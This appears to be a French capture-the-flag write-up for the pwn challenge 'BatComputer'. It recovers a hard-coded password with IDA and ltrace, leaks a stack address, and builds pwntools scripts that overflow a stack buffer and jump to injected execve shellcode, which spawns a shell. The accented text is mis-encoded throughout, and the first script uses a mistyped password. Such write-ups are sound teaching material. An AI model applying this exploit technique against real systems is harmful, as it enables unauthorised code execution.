# BatComputer [Pwn] Challenge

`â€” Le binaire â€”`

Quand nous lanÃ§ons le programme qui est un ELF 64 bit nous pouvons voir 2 choix .

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled.png)

En entrant 1 nous allons recevoir ce message et allons recommencer le programme. On vois directement que `0x7fffaaeb5de4` est une adresse mÃ©moire.  

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%201.png)

En entrant 2 nous allons recevoir un input nous demandant de rentrer un mot de passe.

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%202.png)

Le mot de passe est mauvais le programme va sâ€™arrÃªter.

`â€” IDA â€”`

DÃ©marrons IDA pour observer ce programme en dÃ©taille. Nous allons directement dans IDA-View-A de la fonction main.

On vois lâ€™arbre de la logique du programme et Ã  lâ€™input du mot de passe nous avons un commentaire `; "b4tp@$$w0rd!â€`

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%203.png)

Ici le programme va charger une variable contenant le rÃ©sultat demandÃ© et comparÃ© avec la fonction _strcmp avec notre mot de passe si ils sont Ã©gaux si oui nous allons passÃ© Ã  la suite du programme.

GrÃ¢ce au mot de passe trouvÃ© dans IDA nous avons la possibilitÃ© de continuer le 2Ã¨me chemin.

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%204.png)

Nous avons un deuxiÃ¨me input ou nous pouvons entrer un commande. 

`DeuxiÃ¨me possibilitÃ© :` Nous pouvons trouver ce mot de passe de plusieurs faÃ§ons ici la plus courte avec ltrace qui va nous montrer toutes les fonction utilisÃ© de nos programme. Le seul problÃ¨me en utilisant ltrace câ€™est que entrons dans lâ€™analyse dynamique qui nâ€™est pas Ã  faire sur un exÃ©cutable inconnu. 

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%205.png)

Nous voyons que en rentrant notre mot de passe nous avons eu une comparaison comme dans le code assembleur qui va vÃ©rifiÃ© si notre entrÃ© est `b4tp@$$w0rd!`.

`â€” Exploitation â€”`

En analysant avec ghidra le fichier et en trouvant la bonne fonction `FUN_001011ec` le read aprÃ¨s avoir lu notre derniÃ¨re input pour la commande de navigation va lire auStack84 qui ne peux contenir que 76 entrer

Si nous mettons par exemple 80 A dans la variable il nous faut un return dans ghidra le seul moyen dâ€™avoir un return et de revenir au dÃ©but et dans le choix 1 ou 2 mettre une valeurs incorrecte essayons.

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%206.png)

Nous avons bien rÃ©ussi a faire un crash Ã  notre programme nous devrons donc passer par ce moyen pour exploiter ce programme.

```python
#!/usr/bin/env python3

from pwn import *

def main():
    io = process('./batcomputer')

    #STEP 0
    # EnumÃ©rÃ© les binaires
    password = "b4tp@$$word!"

    #STEP 1
    #Avoir l'adresse du stack
    io.sendlineafter('>', '1')
    stack_address = io.recvline().strip().split()[-1]
    stack_address = ''.join([chr(int(stack_address[i:i+2], 16)) for i in range(2, len(stack_address), 2)])
    stack_address = stack_address.rjust(8, '\x00')
    stack_address = u64(stack_address)
    print(stack_address)
    log.success(f"Leaked stack address: {p64(stack_address)}")

    #STEP2 
    #Buffer Overflow
    io.sendlineafter('>', '2')
    io.sendlineafter("password: ", password)
    payload = "a" * 137
    io.sendlineafter("commands: ", payload)

    #STEP3
    io.sendlineafter('>', '3')
    io.interactive()
if __name__ == '__main__':
    main()
```

Nous devons maintenant exploiter le buffer nous allons dâ€™abord dÃ©terminer la limite de lâ€™entrÃ©e.

```bash
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali]
â””â”€# python3                                                                          
Python 3.10.4 (main, Mar 24 2022, 13:07:27) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(137)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj'
```

On exÃ©cute le programme avec gdb et nous mettons le payload gÃ©nÃ©rer avec cyclic dans command puis nous exÃ©cutons le return en mettant 3.

Dans gdb nous voyons les retour et dans RSP nous avons (â€™vaaawaaaâ€™)

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%207.png)

```bash
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali]
â””â”€# python3                                                                          
Python 3.10.4 (main, Mar 24 2022, 13:07:27) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(137)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj'
>>> cyclic_find('vaaa')
84
```

```python
#!/usr/bin/python3

from pwn import *

def main():
    context.log_level='DEBUG'
    context.update(arch='amd64', os='linux')
    log.info("lets solve")
    p=process('./batcomputer')

    # leak address of my buffer
    p.recvuntil('>')
    p.sendline('1')

    leak_address = p.recvline().split()[-1]
    leak_address = int(leak_address,16)
    log.success(f'leak_address: {hex(leak_address)}')

    # send evil payload
    # payload + eip + shellcode

    padding = b'A' * 84

    shellcode  = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
    shellcode += b"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    shellcode += b"\x54\x5f\x99\x52\x57\x54\x5e\xb0"
    shellcode += b"\x3b\x0f\x05"

    buffer = flat (
            padding,
            p64(leak_address + 84+8),
            shellcode
            )

    p.recvuntil('>')
    p.send('2')
    p.recv()
    p.sendline('b4tp@$$w0rd!')
    p.recvline()
    p.send(buffer)

    # trigger buffer overflow
    p.recvline()
    p.sendline('3')

    p.interactive()

if __name__ == '__main__':
    main()
```